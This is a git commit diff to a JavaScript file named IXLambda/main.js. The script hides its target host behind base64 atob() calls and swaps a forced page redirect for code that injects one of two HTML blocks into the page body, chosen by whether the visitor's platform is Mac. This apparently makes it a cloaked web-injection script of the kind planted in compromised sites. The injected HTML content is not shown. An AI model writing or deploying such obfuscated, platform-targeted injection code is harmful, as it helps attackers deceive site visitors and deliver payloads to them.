a43ccf91b05870c990c8455ead24d01f4519a484
Radio <mraugust852020@outlook.com>
2026-03-11 15:32:02 -0400

    Update main.js

--- IXLambda/main.js
+++ IXLambda/main.js
@@ -1,5 +1,5 @@
 // I walked on my keyboard. (Get it, because I'm a furry? No? OK. 3:)
-var link = `${atob("aHR0cHM6Ly8=")}figswriu${atob("LmJlYW53ZWIucXp6LmlvLmNkbi5jbG91ZGZsYXJlLm5ldC8=")}`;
+var link = `${atob("aHR0cHM6Ly8=")}figswriut${atob("LmJlYW53ZWIucXp6LmlvLmNkbi5jbG91ZGZsYXJlLm5ldC8=")}`;
 
 // HTML data to inject.
 var htmlData = `
@@ -35,13 +35,9 @@ var htmlDataBad = `
 </html>
 `;
 
-window.location.replace(link);
-
-// Eradicate entire page because I'm silly!
-document.open();
-document.write(htmlData);
-// USER AGENT FILTER document.write(navigator.platform.startsWith("Mac") ? htmlData : htmlDataBad);
-document.close();
+// Menu appending.
+var uafFinal = navigator.platform.startsWith("Mac") ? htmlData : htmlDataBad;
+document.body.insertAdjacentHTML("beforeend", uafFinal); // UAF code
 
 // Add silly console notes. 
 console.log("IXLambda loaded successfully! :3");
